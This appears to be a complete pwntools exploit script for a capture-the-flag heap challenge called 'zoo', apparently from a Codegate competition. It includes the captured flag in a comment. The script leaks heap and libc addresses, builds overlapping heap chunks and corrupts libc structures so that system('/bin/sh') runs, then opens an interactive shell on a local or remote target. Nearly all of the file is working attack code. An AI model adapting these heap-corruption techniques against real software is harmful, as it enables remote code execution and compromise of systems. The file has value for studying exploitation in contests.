from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./zoo"
LIBC = "./libc.so.6_zoo"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = "debug"

# Flag: FLAG{When y0u take M3dicine, you $hOuld underst4nd the Function 0f the M3dicine and E4T the right M3dicine}

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def menu(conn, choice):
    conn.recvuntil(">> ") # [7] Close the zoo")
    conn.sendline(str(choice))

def adopt(conn, ch, name):
    menu(conn, 1)
    conn.recvuntil("Lion")
    conn.sendline(str(ch))
    conn.recvuntil("Please name the animal")
    conn.send(name)

def feed(conn, name, m_name=None, m_desc=None):
    """malloc(0x80), [malloc(0x80)]"""
    menu(conn, 2)
    conn.recvuntil("animal will you feed")
    conn.send(name)
    if m_name is not None:
        conn.recvuntil("name of this medicine")
        conn.send(m_name)
        conn.recvuntil("description of this medicine")
        conn.send(m_desc)

def clean(conn, name):
    """free(dung)"""
    menu(conn, 3)
    conn.recvuntil("animal's dung will you clean?")
    conn.send(name)

def walk(conn, name):
    """free(feed)"""
    menu(conn, 4)
    conn.recvuntil("animal do you want to take")
    conn.send(name)

def hospital(conn, name):
    menu(conn, 5)
    conn.recvuntil("animal will you take")
    conn.send(name)

def list(conn, name):
    menu(conn, 6)
    conn.recvuntil("animal info do you")
    conn.send(name)

def give_name(conn, name):
    conn.recvuntil("enter your name")
    conn.send(name)
    conn.recvuntil("open your own zoo")

def exploit(conn, elf, libc, local):
    give_name(conn, "A"*10)
    adopt(conn, 1, "B"*0x14)
    feed(conn, "B"*0x14)
    conn.recvuntil("Your animal ")
    conn.recv(0x14)
    heapbase = u64(conn.recvuntil(" ate")[:-4].ljust(8, "\x00")) - 0x8c0
    log.info("%#x", heapbase)

    def setoverflow(nm):
        adopt(conn, 1, nm)
        for i in range(20):
            feed(conn, nm)
        for i in range(5):
            walk(conn, nm)
        for i in range(5):
            feed(conn, nm)
        hospital(conn, nm)

        # clean heap
        for i in range(20):
            walk(conn, nm)
            clean(conn, nm)
        return

    setoverflow("CC")
    setoverflow("BB")

    sz = (0x620 | 0x1) - 0x1b0
    ptr = heapbase + 0x960 - 0x18
    payload = ""
    payload += "A"*4
    payload += (p64(sz).rstrip("\x00") + "A").ljust(8, "\x00")
    payload += p64(ptr)
    n1 = payload
    setoverflow(payload)
    for i in range(15):
        feed(conn, n1, "A", "A")
        walk(conn, n1)

    p1 = "A"*8
    p2 = "B"*0x60
    feed(conn, "BB", p1, p2)

    p1 = "C"*8
    p2 = "D"*0x60
    feed(conn, "BB", p1, p2)

    p1 = "E"*8
    p2 = "F"*0x60
    # feed(conn, "CC", p1, p2)
    feed(conn, "BB", p1, p2)

    p1 = p64(heapbase + 0x3b0 + 0x1b0)
    p2 = "G"*0x68
    p2 += p64(0x620 - 0x1b0)
    p2 += p64(0x90)
    walk(conn, "BB")
    feed(conn, "BB", p1, p2)

    p1 = p64(heapbase + 0x3b0 + 0x1b0)
    feed(conn, n1, p1, "I"*0x60)

    walk(conn, "BB")
    n1 = "A"*4 + p64(sz + 0x90).rstrip("\x00") + "A"

    feed(conn, "BB", "\x00", "\x00")
    feed(conn, "BB", "\x00", "\x00")

    p1 = "\x00"
    p2 = "\x00" * 0x68
    p2 += p64(0xffffffffffffffff)
    p2 += p64(0x71)
    feed(conn, "BB", "\x00", p2)

    feed(conn, "CC", "\x00", "\x00")
    adopt(conn, 1, "Z"*0x14)

    conn.recvuntil("Z"*0x14)
    libcleak = conn.recv(6)
    libc.address = u64(libcleak.ljust(8, "\x00")) - 0x3c4bd8 # libc bin
    log.info("%#x", libc.address)

    # CC is clean for freeing, now we need overlapping chunks for unsorted bin attack

    walk(conn, "CC")
    feed(conn, "CC", "A"*8, "a"*0x60)
    feed(conn, "CC", "B"*8, "b"*0x60)

    p2 = ""
    p2 += "c" * 0x40
    p2 += p64(0x91)
    p2 += "c" * 0x20
    feed(conn, "CC", "C"*8, p2) # "c"*0x60)
    # feed(conn, "CC", "D"*8, "d"*0x60)

    p2 = ""
    p2 += p64(0)
    p2 += p64(0) # c0
    p2 += p64(0)
    p2 += p64(0) # d0
    p2 += p64(heapbase + 0xcd0 - 0x18) # d8
    p2 += "e" * (0x50 - 0x28)
    # p2 += "e"*0x50
    p2 += p64(0x71)
    # p2 = "e"*0x60
    feed(conn, "BB", "D"*8, p2)
    feed(conn, "BB", "D"*8, "e"*0x60)

    walk(conn, "CC")

    p1 = "F"*8
    p2 = "f"*0x40
    p2 += p64(0x31)
    p2 += p64(heapbase + 0xbe0)
    p2 += p64(heapbase + 0xbe0)
    p2 += "f"*0x10
    p2 += p64(0x30)
    p2 += p64(0x90)
    feed(conn, "BB", "F"*8, p2)
    walk(conn, "CC")

    p2 = ""
    p2 += "A"*0x70
    p2 += p64(0x91)
    feed(conn, "BB", "0"*8, p2)

    p2 = ""
    p2 += "\x00"*16
    p2 += p64(0x91 + 0x90)
    pause()
    feed(conn, "CC", "11111111", p2)
    pause()
    # feed(conn, "BB", "E"*8, "e"*0x60 + p64(0x91))

    walk(conn, "CC")
    walk(conn, "CC")

    p2 = ""
    p2 += "A"*0x10
    p2 += p64(0x121)
    p2 += p64(libc.address + 0x3c4c88)
    p2 += p64(libc.address + 0x3c4c88)
    feed(conn, "CC", "\x00", p2)

    p2 = ""
    # p2 += "A"*0x70
    p2 += "A"*0x40
    p2 += p64(0x21) * 6
    p2 += p64(0x71)
    feed(conn, "CC", "\x00", p2)
    feed(conn, "BB", "\x00", "\x00")

    walk(conn, "CC")
    walk(conn, "CC")

    p2 = ""
    p2 += "A" * 0x8
    p2 += "/bin/sh\x00"
    p2 += p64(0x61)
    p2 += p64(libc.address + 0x3c4c88) # don't care
    p2 += p64(libc.address + 0x3c5520 - 0x10)
    p2 += p64(2)
    p2 += p64(3)
    p2 += p64(libc.symbols['system'])
    feed(conn, "CC", "\x00", p2)

    menu(conn, 2)
    conn.recvuntil(">> ")
    conn.send("CC")
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("ch41l3ng3s.codegate.kr", 7788)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
